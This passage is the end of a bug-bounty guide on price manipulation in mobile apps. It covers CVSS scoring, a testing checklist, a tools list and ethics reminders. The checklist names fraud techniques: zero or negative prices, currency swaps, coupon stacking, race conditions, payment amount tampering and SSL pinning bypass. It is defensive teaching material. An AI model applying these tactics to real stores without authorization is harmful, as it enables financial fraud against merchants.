    if time.time() - token["payload"]["timestamp"] > 300:
        raise ValueError("Price token expired!")
    
    return token["payload"]
```

---

## 13. CVSS Scoring for Price Manipulation

### Scoring Breakdown

| Metric | Value | Justification |
|--------|-------|---------------|
| **Attack Vector** | Network (N) | Exploitable over the internet |
| **Attack Complexity** | Low (L) | Only needs a proxy tool |
| **Privileges Required** | Low (L) | Needs a user account |
| **User Interaction** | None (N) | No victim interaction needed |
| **Scope** | Unchanged (U) | Affects only the vulnerable app |
| **Confidentiality** | None (N) | No data exposure |
| **Integrity** | High (H) | Financial data is modified |
| **Availability** | Low (L) | Potential for service disruption |

### Score Ranges by Scenario

| Scenario | CVSS | Severity |
|----------|------|----------|
| Can modify price but order fails at payment gateway | 4.3 | Medium |
| Can place order at modified price (pre-payment) | 6.5 | Medium |
| Can complete payment at modified price | 7.5 | High |
| Can automate and scale the attack | 8.1 | High |
| Combined with account takeover/mass exploitation | 9.1 | Critical |

---

## 14. Checklist — Quick Reference

Use this checklist for every mobile app you pentest:

### Pre-Test Setup
- [ ] Burp Suite installed and proxy listener on port 8080 (all interfaces)
- [ ] Burp CA certificate exported and installed on device/emulator
- [ ] Device proxy configured pointing to Burp IP:8080
- [ ] SSL pinning bypassed (Frida/objection/APK patch)
- [ ] Traffic flowing through Burp (verified with browser test)

### Reconnaissance
- [ ] Mapped full purchase/checkout flow
- [ ] Identified all API endpoints handling prices
- [ ] Documented request/response format for each endpoint
- [ ] Identified price-related parameters (price, qty, total, tax, fee, discount)
- [ ] Checked for encoded/encrypted parameters (Base64, JWT, etc.)

### Price Manipulation Tests
- [ ] **Direct Price Change:** Modified `unit_price` / `total_amount`
- [ ] **Quantity Manipulation:** Changed `quantity` to lower value
- [ ] **Zero Price:** Set price/total to `0`
- [ ] **Negative Price:** Set price/total to negative value
- [ ] **Delivery Fee Bypass:** Set `delivery_fee` to `0` or negative
- [ ] **Tax Removal:** Set `tax`/`gst` to `0`
- [ ] **Currency Change:** Swapped `currency` code (INR → VND)
- [ ] **Coupon Abuse:** Applied expired/invalid/duplicate coupons
- [ ] **Coupon Stacking:** Applied multiple coupons on same order
- [ ] **Discount Overflow:** Set `discount` > order total
- [ ] **Race Condition:** Sent concurrent requests with different amounts
- [ ] **Payment Gateway Mismatch:** Modified amount in payment initiation
- [ ] **Subscription Downgrade:** Requested premium at basic price
- [ ] **Free Trial Abuse:** Extended trial via parameter manipulation
- [ ] **Response Modification:** Changed server response prices

### Post-Exploitation Evidence
- [ ] Screenshots of each step captured
- [ ] Burp request/response saved (right-click → Save Item)
- [ ] Video recording of full exploitation (recommended)
- [ ] Order confirmation screenshot showing manipulated price
- [ ] CVSS score calculated
- [ ] Professional report written

---

## 15. Tools Reference

| Tool | Purpose | Link |
|------|---------|------|
| **Burp Suite** | HTTP proxy, interceptor, repeater | https://portswigger.net/burp |
| **Frida** | Dynamic instrumentation for SSL bypass | https://frida.re |
| **objection** | Runtime mobile exploration | https://github.com/sensepost/objection |
| **mitmproxy** | Alternative to Burp (free, CLI-based) | https://mitmproxy.org |
| **Genymotion** | Fast Android emulator | https://www.genymotion.com |
| **apktool** | APK decompilation & recompilation | https://apktool.org |
| **jadx** | Java decompiler for APK analysis | https://github.com/skylot/jadx |
| **HTTP Toolkit** | Easy alternative to Burp for mobile | https://httptoolkit.com |
| **Charles Proxy** | Alternative proxy (good for macOS) | https://www.charlesproxy.com |
| **Postman** | API testing after identifying endpoints | https://www.postman.com |
| **ADB** | Android Debug Bridge | Part of Android SDK |

---

## 📌 Key Takeaways

1. **Never trust client-side data** — Prices must be validated server-side
2. **The proxy is your best friend** — Burp Suite reveals everything between app and server
3. **SSL pinning is NOT security** — It's speed bumps, not walls
4. **Always check the full flow** — Cart → Checkout → Payment → Confirmation
5. **Document everything** — Screenshots, requests, responses, timestamps
6. **Report professionally** — Clear steps, impact assessment, and remediation
7. **Stay ethical** — Only test with authorization, report responsibly

---

## 📚 Further Reading

- [OWASP Mobile Testing Guide](https://mas.owasp.org/MASTG/)
- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [PortSwigger Web Security Academy — Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [HackerOne Hacktivity — Price Manipulation Reports](https://hackerone.com/hacktivity)
- [Bugcrowd University](https://www.bugcrowd.com/hackers/bugcrowd-university/)

---

> **Remember:** The goal of security testing is to **make apps safer**, not to exploit them for personal gain. Always follow responsible disclosure practices and respect the scope of any bug bounty program.

---

*Guide by Vishal Rao — Cybersecurity Researcher & Tool Developer*  
*GitHub: [@Vishal-HaCkEr1910](https://github.com/Vishal-HaCkEr1910)*
